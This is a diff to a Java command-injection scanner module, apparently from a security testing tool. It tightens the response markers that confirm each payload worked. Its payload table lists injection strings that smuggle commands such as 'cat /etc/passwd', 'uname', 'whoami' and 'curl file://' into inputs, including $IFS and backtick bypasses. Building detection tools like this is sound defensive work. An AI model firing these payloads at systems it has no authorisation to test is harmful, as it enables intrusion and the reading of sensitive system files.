@@ -122,9 +122,9 @@ public class CommandInjectionScanner implements ScanModule {
             {"|id|", "uid=", "id command piped (Unix)"},
             {"$(id)", "uid=", "id via subshell (Unix)"},
             {"`id`", "uid=", "id via backtick (Unix)"},
-            {";cat /etc/passwd;", "root:", "/etc/passwd read (Unix)"},
-            {"|cat /etc/passwd", "root:", "/etc/passwd piped (Unix)"},
-            {"$(cat /etc/passwd)", "root:", "/etc/passwd subshell (Unix)"},
+            {";cat /etc/passwd;", "root:x:0:0:", "/etc/passwd read (Unix)"},
+            {"|cat /etc/passwd", "root:x:0:0:", "/etc/passwd piped (Unix)"},
+            {"$(cat /etc/passwd)", "root:x:0:0:", "/etc/passwd subshell (Unix)"},
             {";uname -a;", "Linux", "uname (Unix)"},
             {"|uname -a", "Linux", "uname piped (Unix)"},
             {";echo cmdi_confirmed;", "cmdi_confirmed", "echo marker (Unix)"},
@@ -133,12 +133,12 @@ public class CommandInjectionScanner implements ScanModule {
             // Newline separator
             {"%0aid%0a", "uid=", "id via newline (Unix)"},
             // $IFS space bypass
-            {";cat${IFS}/etc/passwd;", "root:", "/etc/passwd via IFS (Unix)"},
+            {";cat${IFS}/etc/passwd;", "root:x:0:0:", "/etc/passwd via IFS (Unix)"},
             // expr math marker for blind output detection
             {";expr 41 + 1;", "42", "expr math marker (Unix)"},
             {"$(expr 41 + 1)", "42", "expr math subshell (Unix)"},
             // Backtick nesting with $IFS
-            {"`cat${IFS}/etc/passwd`", "root:", "/etc/passwd via IFS backtick (Unix)"},
+            {"`cat${IFS}/etc/passwd`", "root:x:0:0:", "/etc/passwd via IFS backtick (Unix)"},
             // whoami — use unique echo wrapper to avoid false positives from generic \w+ matching error pages
             {";echo cmdi_$(whoami)_confirmed;", "REGEX:cmdi_\\w+_confirmed", "whoami echo-wrapped (Unix)"},
             {"|echo cmdi_$(whoami)_confirmed", "REGEX:cmdi_\\w+_confirmed", "whoami echo-wrapped piped (Unix)"},
@@ -166,7 +166,7 @@ public class CommandInjectionScanner implements ScanModule {
             // cat /proc/version
             {";cat /proc/version;", "Linux version", "/proc/version (Unix)"},
             // Curl-based output
-            {"|curl -s file:///etc/passwd", "root:", "curl file proto (Unix)"},
+            {"|curl -s file:///etc/passwd", "root:x:0:0:", "curl file proto (Unix)"},
     };
 
     private static final String[][] OUTPUT_PAYLOADS_WINDOWS = {
